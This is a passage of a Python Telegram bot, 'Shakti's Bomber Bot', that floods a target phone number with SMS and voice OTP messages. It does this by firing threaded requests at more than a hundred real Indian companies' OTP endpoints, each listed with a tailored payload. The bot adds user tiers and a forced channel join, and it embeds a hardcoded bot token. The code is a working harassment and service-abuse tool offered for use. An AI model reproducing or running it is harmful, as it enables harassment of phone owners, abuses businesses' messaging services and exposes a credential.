#!/usr/bin/env python3
# SHAKTI'S BOMBER BOT - SINGLE FILE
# Bot: 8670148817 | Owner: 8490612097

import asyncio
import json
import os
import random
import threading
import time
import datetime
import logging

import requests
from requests.adapters import HTTPAdapter
from telegram import (
    ReplyKeyboardMarkup, InlineKeyboardButton,
    InlineKeyboardMarkup, Update
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

# ===================== LOGGING =====================
logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
log = logging.getLogger("shakti")

# ===================== CONFIG =====================
BOT_TOKEN = "8842615934:AAHJwUGHomdRepfUdyAm_i2Wlx3czsNpPts"
OWNER_ID  = 8490612097

DEFAULT_COUNTRY_CODE = "91"
BOMBING_DELAY_SECONDS = 0.4
MAX_REQUEST_LIMIT = 5000
THREAD_COUNT = 15
TELEGRAM_RATE_LIMIT_SECONDS = 5

CHANNEL_USERNAME = "@ExploitLabX"
CHANNEL_LINK     = "https://t.me/ExploitLabX"
CHANNEL_NAME     = "ExploitLab"
JOIN_CACHE_TTL   = 300

# ===================== APIS (INLINE) =====================
APIS = [
  {"name": "Agrevolution OTP", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Breeze Session Start", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}},
  {"name": "Jockey OTP", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PW Live OTP", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "KPN Fresh OTP", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}},
  {"name": "Aditya Birla OTP", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoPaySense OTP", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BankOpen OTP", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Tata Capital Retail", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TradeIndia OTP", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Khatabook OTP", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Orange Health OTP", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Jobhai OTP", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "AstroSage Varta", "url": "https://varta.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Spinny OTP", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Dream11 OTP", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CityMall OTP", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bella Vita OTP", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Oyo OTP", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"}},
  {"name": "Myma OTP", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Freedo Rentals", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Licious OTP", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Cosmofeed OTP", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bisleri OTP", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Evital OTP", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "QuickRide OTP", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Kwikfix OTP", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Brevistay OTP", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hourly Rooms OTP", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Pagarbook OTP", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vahak OTP", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Redcliffe Labs", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Ixigo OTP", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Testbook OTP", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medibuddy OTP", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Beyoung OTP", "url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "Wrogn OTP", "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medkart OTP", "url": "https://app.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Coverfox OTP", "url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoMechanic OTP", "url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lovelocal OTP", "url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Udaan OTP", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Xylem OTP", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker V1", "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "WoodenStreet", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TooTou", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Nuvama Wealth", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Mpokket", "url": "https://api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PharmEasy v1", "url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Flipkart Signup", "url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Practo", "url": "https://accounts.practo.com/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Ajio", "url": "https://www.ajio.com/api/auth/signupSendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "AltBalaji", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Grab", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Delhivery", "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp", "method": "GET", "headers": {}},
  {"name": "ConfirmTkt Reg", "url": "https://securedapi.confirmtkt.com/api/platform/register", "method": "GET", "headers": {}},
  {"name": "Goibibo", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}}
]

# ===================== FILE PATHS =====================
USERS_FILE           = "users.json"
BANNED_FILE          = "banned_users.json"
PROTECTED_FILE       = "protected_numbers.json"
API_STATUS_FILE      = "api_status.json"
CONFIG_FILE          = "config.json"
LOGS_FILE            = "logs.json"
BOMBING_HISTORY_FILE = "bombing_history.json"
USER_COOLDOWN_FILE   = "user_cooldown.json"
PREMIUM_FILE         = "premium_users.json"
API_STATS_FILE       = "api_stats.json"
COUNTRY_FILE         = "country_config.json"
BLACKLIST_FILE       = "target_blacklist.json"
BACKUP_DIR           = "backups"

os.makedirs(BACKUP_DIR, exist_ok=True)

# ===================== GLOBALS =====================
bombing_active = {}
bombing_threads = {}
request_counts = {}
global_request_counter = threading.Lock()
bot_start_time = time.time()

active_bombings_detail = {}
global_pause = {"active": False}
rate_limit_lock = threading.Lock()
daily_counters = {}

_join_cache = {}
_join_lock = threading.Lock()

# ===================== JSON HELPERS =====================
def load_json(fp, default=None):
    if not os.path.exists(fp):
        return default if default is not None else {}
    try:
        with open(fp, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default if default is not None else {}

def save_json(fp, data):
    tmp = fp + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    os.replace(tmp, fp)

def esc(text: str) -> str:
    for ch in r"_*[]()~`>#+-=|{}.!":
        text = text.replace(ch, "\\" + ch)
    return text

def get_timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ===================== USER MGMT =====================
def is_banned(uid):
    return str(uid) in load_json(BANNED_FILE, [])

def is_protected(num):
    return num in load_json(PROTECTED_FILE, [])

def is_premium(uid):
    return str(uid) in load_json(PREMIUM_FILE, [])

def get_user(uid):
    return load_json(USERS_FILE, {}).get(str(uid))

def update_user(uid, data):
    users = load_json(USERS_FILE, {})
    if str(uid) not in users:
        users[str(uid)] = {
            "id": uid, "join_date": get_timestamp(),
            "total_bombings": 0, "total_requests": 0,
            "last_activity": get_timestamp(),
        }
    users[str(uid)].update(data)
    users[str(uid)]["last_activity"] = get_timestamp()
    save_json(USERS_FILE, users)

def log_action(uid, action, details=""):
    logs = load_json(LOGS_FILE, [])
    logs.append({"timestamp": get_timestamp(), "user_id": uid,
                 "action": action, "details": details})
    save_json(LOGS_FILE, logs[-1000:])

def log_bombing(uid, target, count, status="completed"):
    h = load_json(BOMBING_HISTORY_FILE, [])
    h.append({"timestamp": get_timestamp(), "user_id": uid,
              "target": target, "requests": count, "status": status})
    save_json(BOMBING_HISTORY_FILE, h[-2000:])

# ===================== CONFIG =====================
def get_config():
    return load_json(CONFIG_FILE, {
        "global_delay": BOMBING_DELAY_SECONDS,
        "thread_count": THREAD_COUNT,
        "daily_limit": MAX_REQUEST_LIMIT,
        "owner_id": OWNER_ID,
    })

def save_config(c):
    save_json(CONFIG_FILE, c)

# ===================== API STATUS =====================
def get_api_status():
    return load_json(API_STATUS_FILE, {})

def set_api_status(d):
    save_json(API_STATUS_FILE, d)

def record_api_result(idx, success):
    stats = load_json(API_STATS_FILE, {})
    s = stats.setdefault(str(idx), {"success": 0, "fail": 0, "consec_fail": 0})
    if success:
        s["success"] += 1
        s["consec_fail"] = 0
    else:
        s["fail"] += 1
        s["consec_fail"] += 1
        if s["consec_fail"] >= 15:
            st = get_api_status()
            if st.get(str(idx), True):
                st[str(idx)] = False
                set_api_status(st)
    save_json(API_STATS_FILE, stats)

# ===================== LIMITS =====================
def get_user_limits(uid):
    if uid == OWNER_ID:
        return (10**9, 200, 0)
    if is_premium(uid):
        return (50000, 50, 60)
    return (5000, 15, 300)

def get_cooldown_remaining(uid):
    cd = load_json(USER_COOLDOWN_FILE, {})
    last = cd.get(str(uid), 0)
    _, _, cd_sec = get_user_limits(uid)
    elapsed = time.time() - last
    return int(cd_sec - elapsed) if elapsed < cd_sec else 0

def set_cooldown(uid):
    cd = load_json(USER_COOLDOWN_FILE, {})
    cd[str(uid)] = time.time()
    save_json(USER_COOLDOWN_FILE, cd)

# ===================== DAILY COUNTER =====================
def _today_str():
    return datetime.datetime.now().strftime("%Y-%m-%d")

def _ensure_daily(uid):
    with rate_limit_lock:
        d = daily_counters.get(uid)
        if not d or d.get("date") != _today_str():
            daily_counters[uid] = {"date": _today_str(), "count": 0}

def get_daily_count(uid):
    _ensure_daily(uid)
    return daily_counters[uid]["count"]

def inc_daily_count(uid):
    _ensure_daily(uid)
    with rate_limit_lock:
        daily_counters[uid]["count"] += 1

# ===================== COUNTRY / BLACKLIST =====================
def get_active_country():
    c = load_json(COUNTRY_FILE, {"code": DEFAULT_COUNTRY_CODE})
    return c.get("code", DEFAULT_COUNTRY_CODE)

def is_blacklisted(num):
    bl = load_json(BLACKLIST_FILE, {"patterns": [], "exact": []})
    if num in bl.get("exact", []):
        return True
    for pat in bl.get("patterns", []):
        if num.startswith(pat):
            return True
    return False
# ===================== SESSION =====================
_tls = threading.local()

def _get_session():
    if not hasattr(_tls, "session"):
        s = requests.Session()
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=100)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _tls.session = s
    return _tls.session

# ===================== API CALL =====================
def _build_payload(name, url, phone, cc):
    u = (url or "").lower()
    if "khatabook" in u:
        return {"country_code": f"+{cc}", "phone": phone, "app_signature": "Jc/Zu7qNqQ2"}
    if "agrevolution" in u or "dehaat" in u:
        return {"mobile_number": phone, "client_id": "kisan-app"}
    if "penpencil" in u or "xylem" in u:
        return {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"}
    if "nuvama" in u:
        return {"contactInfo": phone, "mode": "SMS"}
    if "snapmint" in u:
        return {"mobile_number": phone, "device_id": "web"}
    if "housing" in u:
        return {"phone": phone, "country_code": cc}
    if "rentomojo" in u:
        return {"mobileNumber": phone}
    if "caratlane" in u:
        return {"mobile": phone, "country_code": f"+{cc}"}
    if "wakefit" in u:
        return {"phone_number": phone, "country_code": cc}
    if "doubtnut" in u:
        return {"phone": phone, "country_code": cc}
    if "rapido" in u:
        return {"phone_number": phone, "country_code": f"+{cc}"}
    if "tootoo" in u:
        return {"query": 'mutation { sendOtp(mobile: "%s") }' % phone}
    if "confirmtkt" in u:
        return {"mobileNumber": phone}
    if "betterhalf" in u:
        return {"phone": phone, "country_code": f"+{cc}"}
    if "mpokket" in u:
        return {"phoneNumber": phone}
    if "countrydelight" in u:
        return {"mobile": phone}
    if "jockey" in u:
        return {"mobile": phone, "country_code": f"+{cc}"}
    if "kpnfresh" in u:
        return {"phone": phone, "country_code": cc}
    if "breeze" in u:
        return {"phoneNumber": phone, "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"}
    if "licious" in u:
        return {"phone": phone}
    if "spinny" in u:
        return {"phone": phone, "country_code": cc}
    if "dream11" in u:
        return {"phoneNumber": phone, "countryCode": f"+{cc}"}
    if "medkart" in u:
        return {"phone": phone, "country_code": cc}
    if "pagarbook" in u:
        return {"phone": phone, "country_code": cc}
    if "testbook" in u:
        return {"phone": phone}
    if "ixigo" in u:
        return {"phone": phone}
    if "mamaearth" in u:
        return {"phone": phone, "country": cc}
    if "swipe" in u:
        return {"mobile": phone, "country_code": cc}
    if "dealshare" in u:
        return {"phone": phone, "country_code": cc}
    if "nykaa" in u:
        return {"mobile": phone}
    return {"phone": phone, "mobile": phone, "phoneNumber": phone,
            "mobileNumber": phone, "contactNumber": phone,
            "country_code": cc, "countryCode": cc}

def _call_api(api, phone, cc):
    url = api["url"]
    method = api.get("method", "POST").upper()
    headers = dict(api.get("headers", {}))
    headers.setdefault("User-Agent", "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")
    headers.setdefault("Accept", "application/json, text/plain, */*")
    payload = _build_payload(api.get("name", ""), url, phone, cc)
    s = _get_session()
    ct = headers.get("Content-Type", "").lower()
    try:
        if method == "GET":
            r = s.get(url, headers=headers, params=payload, timeout=6)
        elif "json" in ct:
            r = s.post(url, headers=headers, json=payload, timeout=6)
        else:
            r = s.post(url, headers=headers, data=payload, timeout=6)
    except Exception:
        return False
    if r.status_code not in (200, 201, 202, 204):
        return False
    text = (r.text or "").lower()
    if any(k in text for k in ["otp sent", "success", "message id", "true",
                                '"status":"1"', "otp has been", "sms sent"]):
        return True
    if any(k in text for k in ["error", "invalid", "fail", "not found", "blocked"]):
        return False
    return True

def getapi(pn, idx, cc):
    if not get_api_status().get(str(idx), True):
        return False
    if idx < 0 or idx >= len(APIS):
        return False
    ok = _call_api(APIS[idx], str(pn), str(cc))
    record_api_result(idx, ok)
    return ok

def get_api_count():
    return len(APIS)

def get_api_name(idx):
    if 0 <= idx < len(APIS):
        return APIS[idx].get("name", f"API-{idx}")
    return f"API-{idx}"

# ===================== FORCE JOIN =====================
def _join_verified_recently(uid):
    with _join_lock:
        ts = _join_cache.get(uid)
        return bool(ts and (time.time() - ts) < JOIN_CACHE_TTL)

def _mark_joined(uid):
    with _join_lock:
        _join_cache[uid] = time.time()

def _invalidate_join(uid):
    with _join_lock:
        _join_cache.pop(uid, None)

async def is_user_joined(context, uid):
    if _join_verified_recently(uid):
        return True
    try:
        m = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=uid)
        if m.status in ("creator", "administrator", "member"):
            _mark_joined(uid)
            return True
        if m.status == "restricted" and getattr(m, "is_member", False):
            _mark_joined(uid)
            return True
        return False
    except Exception as e:
        log.warning(f"get_chat_member {uid}: {e}")
        return False

def _join_screen_text():
    return (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "   🔐 *CHANNEL VERIFICATION*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "To use this bot, you must join\n"
        "our official channel first\\.\n\n"
        f"📢 *Channel:* `{esc(CHANNEL_USERNAME)}`\n"
        f"🏷️ *Name:* {esc(CHANNEL_NAME)}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 *Steps:*\n"
        "1\\. Click *📢 JOIN CHANNEL*\n"
        "2\\. Join the channel\n"
        "3\\. Come back and click *VERIFY*\n\n"
        "⚠️ _Verify won't work without joining\\._\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

def join_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ VERIFY & CONTINUE", callback_data="join_check")],
        [InlineKeyboardButton("❓ How to Join", callback_data="join_help")],
    ])

async def prompt_join(msg):
    txt, kb = _join_screen_text(), join_keyboard()
    if hasattr(msg, "edit_message_text"):
        try:
            await msg.edit_message_text(txt, reply_markup=kb,
                parse_mode="MarkdownV2", disable_web_page_preview=True)
            return
        except Exception:
            pass
    await msg.reply_text(txt, reply_markup=kb,
        parse_mode="MarkdownV2", disable_web_page_preview=True)

async def send_main_menu(context, chat_id, uid):
    kb = [["🔥 Start Bombing", "🛑 Stop Bombing"]]
    if uid == OWNER_ID:
        kb += [["🛡️ Set Protected", "📘 Show Protected"], ["🔐 Admin Panel"]]
    await context.bot.send_message(
        chat_id=chat_id,
        text=esc("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   🤖 BOMBER BOT\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n✅ Verified\n🎯 Ready to go\n\n👇 Choose an option:"),
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True),
        parse_mode="MarkdownV2")

async def join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    data = q.data

    if data == "join_help":
        help_txt = (
            "❓ *HOW TO JOIN*\n\n"
            "1\\. Click *📢 JOIN CHANNEL* above\n"
            "2\\. Telegram will open the channel\n"
            "3\\. Press *Join*\n"
            "4\\. Come back and click *✅ VERIFY & CONTINUE*\n\n"
            f"🔗 Direct link:\n{esc(CHANNEL_LINK)}\n\n"
            "Still having issues?\n• Update Telegram\n• Or send /start again"
        )
        await q.answer()
        await q.edit_message_text(help_txt,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
                [InlineKeyboardButton("✅ VERIFY & CONTINUE", callback_data="join_check")],
                [InlineKeyboardButton("🔙 Back", callback_data="join_back")],
            ]), parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    if data == "join_back":
        await q.answer()
        await prompt_join(q)
        return

    if data == "join_check":
        _invalidate_join(uid)
        await q.answer("🔍 Verifying...", show_alert=False)
        if await is_user_joined(context, uid):
            await q.answer("✅ Verified! Welcome 🔥", show_alert=True)
            try:
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   ✅ *VERIFICATION COMPLETE*\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Welcome\\! You can now use the bot\\.\n\nLoading menu\\.\\.\\.",
                    parse_mode="MarkdownV2")
            except Exception:
                pass
            await asyncio.sleep(0.5)
            await send_main_menu(context, q.message.chat_id, uid)
        else:
            await q.answer("❌ You haven't joined yet!", show_alert=True)
            not_joined_txt = (
